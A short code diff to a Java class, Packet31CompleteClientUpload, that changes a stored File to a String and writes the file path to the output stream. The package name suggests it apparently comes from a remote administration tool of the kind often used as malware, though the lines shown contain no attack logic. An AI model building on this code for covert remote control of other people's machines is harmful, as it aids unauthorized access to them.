@@ -7,15 +7,15 @@ import se.jrat.common.io.StringWriter;
 
 public class Packet31CompleteClientUpload extends AbstractOutgoingPacket {
 	
-	private File file;
+	private String file;
 	
-	public Packet31CompleteClientUpload(File file) {
+	public Packet31CompleteClientUpload(String file) {
 		this.file = file;
 	}
 
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		
+		sw.writeLine(file);
 	}
 
 	@Override
